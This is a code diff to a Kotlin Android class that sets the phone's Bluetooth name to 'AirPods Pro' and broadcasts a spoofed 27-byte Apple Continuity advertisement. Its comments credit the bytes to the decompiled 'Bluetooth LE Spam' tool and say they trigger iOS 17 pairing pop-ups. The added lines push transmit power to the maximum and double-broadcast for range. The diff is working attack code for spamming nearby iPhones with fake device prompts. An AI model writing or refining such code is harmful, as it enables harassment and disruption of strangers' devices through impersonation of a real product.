@@ -43,10 +43,9 @@ class BleBroadcaster(private val bluetoothAdapter: BluetoothAdapter) {
         if (leAdvertiser == null) results.add("❌ 不支持 BLE 外设广播模式")
         else results.add("✅ 支持 BLE 外设广播模式")
 
-        results.add("\n📡 使用 Apple Continuity 协议:")
-        results.add("   完整 27 字节广播报文")
-        results.add("   来源: Bluetooth LE Spam 逆向")
-        results.add("   支持 iOS 17 弹窗")
+        results.add("\n📡 Apple Continuity 协议")
+        results.add("   27 字节完整报文 | 最高功率")
+        results.add("   双重广播增强距离")
         return results
     }
 
@@ -58,22 +57,18 @@ class BleBroadcaster(private val bluetoothAdapter: BluetoothAdapter) {
                 return lastResult
             }
 
-        // 改名
         try { bluetoothAdapter.name = "AirPods Pro" } catch (_: Exception) {}
         try { Thread.sleep(200) } catch (_: Exception) {}
 
-        // ★★★ Apple Continuity 协议报文 ★★★
-        // 从 Bluetooth LE Spam 反编译提取
-        // AirPods Pro 的完整 Continuity 广播数据
-        //
-        // 格式: 07 + 能力 + 设备类型 + 认证数据 + 状态 + 电量 + 填充
+        // ★★★ Apple Continuity 完整报文 ★★★
+        // 用 .toByte() 处理超出 127 的值
         val continuityData = byteArrayOf(
-            0x07,             // Setup Type (配对弹窗触发)
-            0x19, 0x07,       // Device Capabilities (0x0719)
-            0x0E,             // 设备类型: AirPods Pro
-            0x20, 0x75, 0xAA, 0x30, // 认证/加密标识
-            0x01, 0x00, 0x00,       // 状态/特征
-            0x45, 0x12, 0x12, 0x12, // 电量信息
+            0x07,                   // Setup Type
+            0x19, 0x07,             // Device Capabilities
+            0x0E,                   // AirPods Pro
+            (0xAA).toByte(), 0x30.toByte(), (0xAA).toByte(), 0x30,  // 加密认证
+            0x01, 0x00, 0x00,       // 状态
+            0x45, 0x12, 0x12, 0x12, // 电量
             0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,
@@ -89,6 +84,7 @@ class BleBroadcaster(private val bluetoothAdapter: BluetoothAdapter) {
             .setIncludeDeviceName(true)
             .build()
 
+        // ★ 双重增强：高频 + 最大功率 + 可连接
         val settings = AdvertiseSettings.Builder()
             .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
             .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
